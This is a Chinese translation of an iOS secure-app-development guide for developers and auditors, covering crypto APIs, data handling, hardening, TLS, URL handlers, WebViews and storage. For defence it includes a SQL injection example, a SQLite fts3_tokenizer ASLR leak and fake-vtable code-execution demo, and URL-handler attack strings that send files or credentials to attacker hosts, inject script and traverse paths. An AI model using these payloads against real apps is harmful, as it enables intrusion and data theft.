# 安全的 iOS 应用程序开发



本指南汇集了 iOS 应用程序中最常见的漏洞。重点是应用程序代码中的漏洞，仅略微涵盖一般 iOS 系统安全性、Darwin 安全性、C/ObjC/C++ 内存安全性或高级应用程序安全性。

尽管如此，希望该指南可以作为 iOS 应用程序开发人员的培训材料，以确保他们发布更安全的应用程序。此外，iOS 安全审查人员可以在评估期间将其用作参考。

> **就像任何软件一样，除非我们更新本指南，否则它会失效。我们鼓励大家在这方面帮助我们，只需打开一个问题或发送一个请求请求！**

## API 级问题

### API：生成加密强度高的随机数

通常，iOS 提供易于使用的加密接口。不要实施自定义加密算法（除了加密问题，它还会在 App Store 审查期间引起问题）。

仅向加密函数提供加密强度高的随机数。

> **审核提示：**检查是否使用随机化服务编程接口获取了所有加密安全随机数。

正确示例：

```
int r = SecRandomCopyBytes(kSecRandomDefault, sizeof(int), (uint8_t*) &res);
```

### API：防止在应用程序后台运行期间泄露敏感数据

当 iOS 后台应用程序时，该应用程序的屏幕截图用于保存到本地文件系统上的未加密缓存中。例如，当用户按下主页按钮时，就会发生这种情况。Apple 建议开发人员在这种情况发生之前隐藏任何敏感信息。但是，在测试 iOS 10 时，屏幕截图存储在加密的应用程序沙箱中。因此它的风险较小。

如果应用程序正在处理敏感的用户数据，请验证是否存在用于隐藏或模糊敏感元素或整个窗口的代码。

> **审计提示：**检查隐藏代码在`applicationDidEnterBackground`.

或者，您可以设置 `allowScreenShot`. 使用`ignoreSnapshotOnNextApplicationLaunch`似乎坏了。

### API：安全地处理粘贴板

如果粘贴板被标记为持久性，它可能会与潜在的敏感用户数据一起保存到本地存储。另外，请确保在应用程序背景时清除粘贴板。

> **审核提示：**检查`UIPasteboardNameGeneral`& `UIPasteboardNameFind`。

### API：禁用敏感输入字段的自动更正

某些 iOS 版本会缓存键盘条目以进行自动更正。这对密码字段是禁用的，但也应该对其他敏感字段（例如信用卡号）禁用。设置以下内容以防止出现这种情况：

```
UITextField autoCorrectionType = UITextAutocorrectionTypeNo
```

`secureTextEntry`或使用属性将文本字段标记为安全（隐藏输入） 。

> **审计提示：**检查敏感的非密码输入字段（例如信用卡），这些字段没有`UITextAutoCorrectionNo`.

## 数据处理问题

### 处理数据：安全地反序列化数据

在反序列化过程中，一些对象在内存中重新实例化。因此，如果序列化数据来自不受信任的来源，则可能会执行代码。

在编写自己的类时，遵守`NSSecureCoding`协议通常是个好主意，以确保从外部源构建的类是预期的类。`UIActivityViewController`对于用于应用程序间通信 ( )的类，Apple 也需要它。

> **审计提示：**检查来自不受信任来源的不安全反序列化。某些反序列化 ( `NSCoding`, `NSCoder`) 必须检查反序列化数据是否在范围内。

> **审计提示：**其他反序列化（`CFBundle`, `NSBundle`, `NSKeyedUnarchiverDelegate`, `didDecodeObject`, `awakeAfterUsingCoder`）在反序列化时返回不同的对象会直接导致代码执行。

> **审核提示：**检查 nib 文件是否未从不受信任的来源动态加载。

### 处理数据：避免 SQL 注入

如果将攻击者提供的字符串连接到 SQL 查询，则可能会在 sqlite 数据库上发生 SQL 注入。这可能会从数据库中泄露敏感信息或注入恶意负载。

> **审计提示：**检查调用`sqlite3_exec()`和其他未准备好的 SQL 函数。`sqlite3_prepare*()`应该改用函数。

不正确的例子：

```
NSString *uid = [myHTTPConnection getUID];
NSString *statement = [NSString StringWithFormat:@"SELECT username FROM users
where uid = '%@'",uid];
const char *sql = [statement UTF8String];
```

正确示例：

```
const char *sql = "SELECT username FROM users where uid = ?";
sqlite3_prepare_v2(db, sql, -1, &selectUid, NULL);
sqlite3_bind_int(selectUid, 1, uid);
int status = sqlite3_step(selectUid);
```

更糟糕的是，iOS 中的 libsqlite3.dylib 支持`fts3_tokenizer`function，它在设计上存在两个安全问题。这个 SQL 函数有两个原型：

```
SELECT fts3_tokenizer(<tokenizer-name>);
SELECT fts3_tokenizer(<tokenizer-name>, <sqlite3_tokenizer_module ptr>);
```

第一个 from 可以被滥用来泄露 libsqlite3.dylib 的基地址，从而破坏 ASLR。

```
FMResultSet *s = [db executeQuery:@"SELECT hex(fts3_tokenizer('simple')) as fts;"];
while ([s next]) {
    NSString *val = [s stringForColumn:@"fts"];
    NSLog(@"val: %@", val); // the address of simpleTokenizerModule in libsqlite3.dylib, in big endian
}
```

如果给出第二个参数，它会注册一个新的分词器，参数是一个虚函数表的地址。这将导致通过 SQLite3 回调执行本机代码：

```
[db executeUpdate:@"select fts3_tokenizer('simple', x'4141414141414141');"]; // a fake virtual table
[db executeUpdate:@"drop table a if exists;"]; // in case the virtual table already extst
FMResultSet *result = [db executeQuery:@"create virtual table a using fts3;"];
NSLog(@"%d", [result next]); // trigger pointer dereference
```

崩溃信息：

```
thread #1: tid = 0x19ac77, 0x0000000184530764 libsqlite3.dylib`___lldb_unnamed_symbol1073$$libsqlite3.dylib + 1500, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0x4141414141414149)
```

## 应用强化

### 强化：启用利用缓解编译时选项

为了让攻击者更难利用 iOS 应用程序，请确保启用平台利用缓解选项。

> **审核提示：**检查是否启用了用于缓解漏洞利用的编译器和链接器标志。

要启用的标志：

- Objective-C 自动引用计数 ( `-fobjc-arc`) 有助于防止 use-after-free 和 use-after-release 错误。对于共享代码、对性能敏感的代码或遗留代码库，可能无法始终启用 ARC。检查：

  `otool -I -v binary | grep _objc_autorelease`

- 堆栈粉碎保护（`-fstack-protector-all`）。这可能有助于防止堆栈缓冲区溢出。检查（默认情况下应该打开）：

  `otool -I -v binary | grep stack_chk_guard`

- 完整的 ASLR - 位置无关的可执行文件 ( `-pie`)。这使得攻击者更难找到已知的代码位置。（Apple App Store 为 iPhone 5+ 目标保护这一点）。检查（默认情况下应该打开）：

  `otool -hv binary | grep PIE`

### 加固：查看Xcode的静态分析报告

静态分析可以帮助揭示内存泄漏、释放后使用、释放后使用和其他错误。

> **审核提示：**检查 Xcode 的“Build & Analyze”的输出

### 强化：检查是否禁用了对第三方键盘的支持

默认情况下，iOS8+ 允许第三方应用程序覆盖内置键盘，可能会将击键或文字泄露给不受信任的方。根据应用程序风险状况，这可能既是安全问题又是合规问题。这就是[在 Swift 中禁用](https://stackoverflow.com/questions/34863291/how-does-one-disable-third-party-keyboards-in-swift)它的方法。

## 网络级问题

### 网络：安全地使用 GTMSessionFetcher 通信

默认情况下， [GTMSessionFetcher](https://github.com/google/gtm-session-fetcher) 不会加载任何非 https URL 方案。

> **审计提示：**使用 `allowedInsecureSchemes`、`allowLocalhostRequest`或 来检查是否没有异常`GTM_ALLOW_INSECURE_REQUESTS`。

### 网络：配置应用程序传输安全 (ATS)

默认情况下，针对 iOS 9 链接的应用程序无法建立不受保护的 HTTP 连接。检查 ATS 配置是否正确。

> **审计提示：**检查`Info.plist`.

> **审核提示：**检查 HTTPS 域列表`Info.plist`是否正确。

在 iOS 10 中，提供了一些新的异常：

1. 流媒体使用例外`AVFoundation`
2. `NSAllowsArbitraryLoadsInWebContent`将豁免 ATS`WKWebView`

### 网络：安全地使用本机 TLS/SSL

SSL 应该用于所有通信，以防止攻击者读取或修改网络上的流量。

> **审核提示：**检查除本地 WebView 之外的所有 API 是否都使用 SSL（https 方案，无 http）。

> **审核提示：**检查授权令牌永远不会在 URL 中传递，而仅在 HTTPS 请求的标头中传递（例如，作为 Cookie 标头）。这里的问题是它们无意中登录了 ISP/公司代理，或者在用户不知情的情况下通过引荐来源意外泄露。
>
> **审核提示：**检查发布版本中是否未启用 SSL 的调试选项：
>
> - ```
>   NSStream:
>   ```
>
>   - `kCFStreamSSLLevel`
>   - `kCFStreamSSLAllowsExpiredCertificates`
>   - `kCFStreamSSLAllowsAnyRoot`
>   - `kCFStreamSSLAllowsExpiredRoots`
>   - `kCFStreamSSLValidatesCertificateChain`
>
> - ```
>   NSURLRequest
>   ```
>
>   - `setAllowsAnyHTTPSCertificate`
>
> - ```
>   NSURLConnection
>   ```
>
>   - `continueWithoutCredentialForAuthenticationChallenge`
>
> - `ValidatesSecureCertificate`
>
> - `setValidatesSecureCertificate`

## IO 问题

### IO：验证传入的 URL 处理程序调用

URI 处理程序是应用程序的特殊入口点，可以从电子邮件、聊天、浏览器或其他应用程序调用。它们可以用作利用逻辑漏洞、XSS、XSRF 类漏洞或缓冲区溢出的攻击的传送工具。

> **审核提示：**检查由应用程序注册和处理的 URI 处理程序 (`registerForRemoteNotificationTypes`和`handleOpenURL`)。

为了说明问题，一些可行的攻击思路：

```
myapp://cmd/run?program=/path/to/program/to/run
myapp://cmd/set_preference?use_ssl=false
myapp://cmd/sendfile?to=evil@attacker.com&file=some/data/file
myapp://cmd/delete?data_to_delete=my_document_ive_been_working_on
myapp://cmd/login_to?server_to_send_credentials=malicious.webserver.com
myapp://cmd/adduser='>"><script>javascript to run goes here</script>
myapp://use_template?template=/../../../../../../../../some/other/file
```

> **审计提示：**在 URI 请求的解析过程中检查`userInfo`和验证。`launchOptions`对于 URL 处理程序之后的操作，重要的是在采取操作之前要求用户确认。

此外，请注意其他应用程序可能能够注册相同的 URL 处理程序并拦截请求。传递高度敏感的信息时，最好对 URL 处理程序传输的数据进行签名和/或加密，以防止泄露和/或伪造。

### IO：验证传出请求和 URL 处理程序

> **审计提示：**检查 . 发出的传出请求`UIWebView`。应该只允许特定的方案白名单 (http/https) 以避免`file:`, `facetime:`, `facetime-audio:`, `sms:`, 或其他`app-id:`URL。确保过滤`tel:`URL（或要求用户确认），因为它们可用于自动拨打产生费用的电话号码。

检查传出请求的正确方法如下所示：

```
- (BOOL)webView:(UIWebView *)webView shouldStartLoadWithRequest:(NSURLRequest
  *)request navigationType:(UIWebViewNavigationType)navigationType;
```

如果您正在使用，则`WKWebView`需要使用协议中的 `-webView:decidePolicyForNavigationAction:decisionHandler:`方法 `WKNavigationDelegate`来捕获此类请求。

### IO：防止 WebView UI 纠正

> **审核提示：**检查允许浏览器 UI 修正的 WebView，例如可以显示类似于原始应用程序或登录屏幕的 UI 的全屏 WebView。攻击者可以使用此类 WebView 进行网络钓鱼。

> **审核提示：**检查允许像浏览器一样浏览网页但不提供典型的浏览器安全 UI（如指示域和 TLS 状态的 URL 栏）的 WebView。此外，请确保如果 WebView 允许浏览网页，则 WebView 中仍然存在常见的浏览器安全功能，如防止混合内容。

### IO：避免 WebView 中的 XSS

> **审核提示：**检查`UIWebView`/`WKWebView`是如何处理字符串的，因为可能会发生类似于 XSS 的攻击。中的 XSS`UIWebView`可能会泄露本地文件，例如地址簿和 cookie。XSS in`WKWebView`受到更多限制，因为 `AllowUniversalAccessFromFileURLs`和`AllowFileAccessFromFileURLs`默认情况下处于关闭状态。还要确保 WebView 不容易重定向，而重定向可用于网络钓鱼。

### IO：避免使用 UIWebView 进行本地 HTML 预览

> **音频提示：**检查是否使用 UIWebView 实现了文件预览功能。它与 XSS 具有相同的影响，只是整个页面都在攻击者的控制之下。由于起源是`file://`，UIWebView 允许读取本地文件并向任意第三方网站发送 AJAX 请求。
>
> 确保使用 [QLPreviewController](https://developer.apple.com/documentation/quicklook/qlpreviewcontroller) 来预览文件附件。它在 iOS <=9 上禁用 javascript，否则它使用默认不允许本地文件和跨域互联网访问的 WKWebView。

## 内存损坏问题

### 内存：防止空字节注入

CF/NS 字符串在不同位置包含 NULL 字节。当发生不安全的转换时，字符串可能会提前终止。

> **审核提示：**`CFDataRef / CFStringRef / NSString`检查和 C 字符串的原始字节之间的错误转换 。

此示例显示不正确的转换：

```
NSString *fname = @"user_supplied_image_name\0";
NSString *sourcePath = [[NSString alloc] initWithFormat:@"%@/%@.jpg",
                        [[NSBundle mainBundle] resourcePath],
                        fname];
printf("%s", [sourcePath
UTF8String]);
// prints [...]Products/Debug/user_supplied_image_name without the .jpg ending
```

### 内存：防止格式化字符串攻击

格式化字符串攻击可以安装在传统函数（`printf`、`scanf`、 `syslog`等）上，也可以安装在 iOS 平台函数上。Xcode Build & Analyze 选项应该能捕捉到大部分缺失的格式字符串。

> **审核提示：**检查以下函数是否缺少格式字符串：

- `CFStringCreateWithFormat`

- `CFStringCreateWithFormatAndArguments`

- `CFStringAppendFormat`

- `[NSString stringWithFormat:]`以及其他`NSString`将格式化字符串作为参数的方法：

  - `[NSString initWithFormat:]`

  - `[NSString *WithFormat]`

  - `[NSString stringByAppendingFormat]`

  - `appendingFormat`

  - 错误示例：

    `[x stringByAppendingFormat:[UtilityClass formatStuff:attacker.text]];`

  - 正确示例：

    `[x stringByAppendingFormat:@"%@", [UtilityClass formatStuff:attacker.text]];`

- `[NSMutableString appendFormat]`

- `[NSAlert alertWithMessageText]`

- `[NSPredicate predicateWithFormat:]`

- `[NSPredicate predicateWithFormat:arguments:]`

- `[NSException raise:format:]`和`[NSException raise:format:arguments:]`

- `NSRunAlertPanel`以及其他创建或返回面板或工作表的应用程序套件功能

- `[NSLog]`

## 使用 Swift 构建的应用程序的安全注意事项

如果您使用 Swift 开发 iOS 应用程序，请记住以下几点：

- Swift 默认使用自动引用计数 (ARC)，这非常有帮助。
- 如果使用字符串插值，则没有格式化字符串攻击的风险。
- 整数溢出会导致运行时错误。
- 由于缺少指针，通常不会发生缓冲区溢出，除非 `UnsafePointer`用于 C 兼容性。

此外，在处理敏感内存时，请注意 Swift 不会轻易让您删除敏感数据，例如密码。一种方法是使用`UnsafeMutablePointer`或 `UnsafeCollection`（有关更多信息，请参阅[Secure Memory for Swift Objects](http://stackoverflow.com/questions/27715985/secure-memory-for-swift-objects) ）。

## 指南：我应该在 iOS 上的什么地方存储我的数据？

### 我可以在哪里存储我的数据？

- 钥匙串服务
  - 加密的键/值存储旨在保存：
    - 通用密码
    - 互联网密码（密码+协议+服务器）
    - 证书
    - 私钥
    - 身份（证书+私钥）
  - 最大原始值大小为 ~16MB。
  - 钥匙串可以共享（这就是 SSO 在 iOS 上的工作方式）或对应用程序私有。
    - 钥匙串只能由来自同一供应商的应用程序共享。
    - 与 Prod 相比，Enterprise/Dogfood 应用具有不同的供应商 ID。

您的应用程序可以访问其自己的特定于应用程序的文件系统沙盒；有关详细信息，请参阅 Apple 的[文件系统编程指南](https://developer.apple.com/library/ios/documentation/FileManagement/Conceptual/FileSystemProgrammingGuide/FileSystemOverview/FileSystemOverview.html#//apple_ref/doc/uid/TP40010672-CH2-SW12) （特别是 iOS 部分）。

- 文件/
  - 用户创建的数据应该对用户可见
  - 在 iTunes 中可选择对用户可见
    - 子目录一般都没有，专用工具还是可以打开的
  - 支持
    - 用户可以禁用特定应用程序的备份
    - 应用程序可以通过设置禁用路径 `NSURLIsExcludedFromBackupKey`
- 图书馆/缓存/
  - 半持久缓存文件
  - 用户不可见
  - 未备份
  - 如果应用程序未运行，可能会随时被操作系统删除
    - 根据存储压力自动管理
- 图书馆/应用支持/
  - 运行应用程序所需的持久文件
  - 用户不可见
  - 支持
    - 用户可以禁用特定应用程序的备份
    - 应用程序可以通过设置禁用路径 `NSURLIsExcludedFromBackupKey`
- 图书馆/首选项/
  - 作为/应用支持/
  - 按照惯例，只有创建的文件`NSUserDefaults`
- 图书馆/*
  - 作为/应用支持/
- 临时工/
  - 非持久缓存文件
  - 用户不可见
  - 未备份
  - 当应用程序未运行时，操作系统会定期删除

### 操作系统是否保护钥匙串？如何？

现代 iOS 设备（后 Touch ID）上的钥匙串使用[硬件模块](https://www.google.com/search?q=secure+enclave)进行保护。没有已知的通过硬件或软件直接破坏钥匙串的攻击；越狱设备容易受到某些攻击。

没有用户的 iCloud 密码，无法恢复钥匙串备份（到 iCloud）。钥匙串数据不包含在本地备份中，除非该备份使用密码加密。

### 操作系统是否保护我在磁盘上的文件？如何？

是的，操作系统提供了四个级别的保护。请注意，iCloud 的备份始终是加密的，而 iTunes 中的备份可选择加密；未加密的备份不会备份在以下任何受保护类别中标记的数据。设备的文件系统在现代 iOS 上的 DMA 路径上被加密；这些选项增加了额外的安全层。

- ```
  NSFileProtectionComplete
  ```

  \- 最安全

  - 只有在设备解锁时才可读。
  - 设备锁定时文件关闭。
  - 适用于大多数应用程序和数据。

- ```
  NSFileProtectionCompleteUnlessOpen
  ```

  - 只有在设备解锁时才能打开文件。
  - 设备锁定时文件不会关闭。
  - 当最后一个打开的句柄关闭时，文件被加密。
  - 适用于后台上传的数据等。

- ```
  NSFileProtectionCompleteUntilFirstUserAuthentication
  ```

   

  （默认）

  - 在设备启动后解锁一次之前，文件是不可访问的。
  - 适用于应在启动后尽快启动的后台进程。
    - 地理围栏数据
    - 蓝牙配件（例如 Android Wear）
  - 一般来说，所有的用户数据都应该至少在这个级别。

- ```
  NSFileProtectionNone
  ```

  \- 最不安全

  - 没有保护。
  - 适用于某些必须在启动时立即访问数据而无需任何用户交互的应用程序。这种加密/解密由操作系统和钥匙串透明地处理。相关的解密密钥在适当的时候从钥匙串中创建，并在适当的时候从内存中删除； 有关详细信息，请参阅[本指南。](https://developer.apple.com/library/ios/documentation/iPhone/Conceptual/iPhoneOSProgrammingGuide/StrategiesforImplementingYourApp/StrategiesforImplementingYourApp.html#//apple_ref/doc/uid/TP40007072-CH5-SW21)

### 我应该在哪里存储我的数据？

- 敏感和持久数据 - 凭据、令牌等？钥匙链。

- 大型敏感和持久文件？

  - 将其保存到`Library/*`目录中。
  - 从备份中排除它。
    - Keychain 备份比文件系统备份具有更高级别的安全性。
  - 设置适当的加密选项 - 尽可能安全。

- 敏感缓存数据？

  - 保存到`Library/Caches/*`
  - 设置适当的加密选项 - 尽可能安全。

- 应用配置？

  - `NSUserDefaults`？`Library/Preferences/[Name].plist`
  - 其他/自定义格式？`Library/Application Support/*`
  - 设置适当的加密选项 - 尽可能安全。

- 应该备份的持久性内容？

  - 用户生成和用户可见？

    - `Documents/*`目录。

    - 如果您希望用户使用 iTunes 文件共享，请不要使用子目录。

    - ```
      NSFileProtectionCompleteUntilFirstUserAuthentication
      ```

      如果需要，这可能是最合适的加密选项。

      - 请注意，如果启用了 iTunes 文件共享，受信任计算机上的恶意软件可以访问此目录。

  - 不应该对用户可见？

    - `Library/Application Support/*`
    - 设置适当的加密选项。

## 存储的最佳实践

### 安全地存储文件

被盗或丢失的 iOS 设备可能会被越狱或拆解，并且可以读取本地文件系统的内容。因此，iOS 应用程序开发人员需要确保加密敏感信息，如凭据或其他私人信息。

Keychain 已经允许您防止物品离开设备或被包含在备份中。

在此之上：

- 项目可以在访问时要求用户同意；
- 可以将该同意设置为 Touch ID，并使用设备密码作为后备；
- 如果删除密码，项目可能无法访问。

最安全的情况是需要将项目标记为仅限设备，需要 Touch ID 才能访问，并且如果密码被删除则无效。

请记住：您还可以在钥匙串中存储任何文本，而不仅仅是用户名和密码凭据。Apple 使用它来同步设备之间的 Wifi 凭据，这样当您将笔记本电脑连接到网络时，您的手机也可以在同步完成后几秒钟后进行同步，从而避免您在手机上输入那些长密码。有关详细信息的更多信息，请查看[Apple iOS 安全白皮书](http://www.apple.com/business/docs/iOS_Security_Guide.pdf)。

> **审计提示：**检查未使用 `kSecAttrAccessibleWhenUnlocked`或的存储数据`kSecAttrAccessibleAfterFirstUnlock`。例如，如果它正在使用`kSecAttrAccessibleAlways`，则数据未得到充分保护。

> **审计提示：**检查创建的文件`NSFileProtectionNone`——它们没有保护。请注意，在没有明确保护的情况下创建的文件不一定使用`NSFileProtectionNone`. 确保使用以下其中一项：
>
> - `NSFileProtectionComplete`
> - `NSFileProtectionCompleteUnlessOpen`（密钥在锁定和文件打开时保留在内存中）
> - `NSFileProtectionCompleteUntilFirstUserAuthentication`（锁定时密钥保留在内存中）

### 创建安全的临时文件

> **审核提示：**检查是否使用了安全的临时文件和目录-例如`URLForDirectory`，，，`NSTemporaryDirectory`。 `FSFindFolder(kTemporaryFolderType)`另请参阅 Apple 安全编码指南中的[正确创建临时文件。](https://developer.apple.com/library/mac/documentation/Security/Conceptual/SecureCodingGuide/Articles/RaceConditions.html#//apple_ref/doc/uid/TP40002585-SW10)

### 避免不安全的目标文件和 API

> **审核提示：**检查 NSLog/Alog、plist 或本地 sqlite 数据库中的私人信息 (PII)。它可能未加密。从 iOS 10 开始，日志记录是加密的。

> **审计提示：**检查是否只有适当的特定于用户的非敏感信息被写入 iCloud 存储。用于`NSURLIsExcludedFromBackupKey`防止将文件备份到 iCloud 和 iTunes。

> **审核提示：**对于 Keychain，`kSecAttrSynchronizable`如果该项目不用于 iCloud Keychain 备份，请检查它是否为 false（默认情况下为 false）。

> **审核提示：**检查 [NSUserDefaults](https://developer.apple.com/library/mac/documentation/Cocoa/Reference/Foundation/Classes/NSUserDefaults_Class/) 是否仅包含设置而没有个人信息。

## 使用 Jaibreak 测试设备

检查设备是否越狱有助于做出某些应用内安全决策。攻击者可以运行 Cycript、GDB 或 Snoop-it 等工具来执行运行时分析并从您的应用程序中窃取敏感数据。越狱检测可以防止这种情况。

> **审核提示：**测试该应用程序是否无法在破解设备上运行。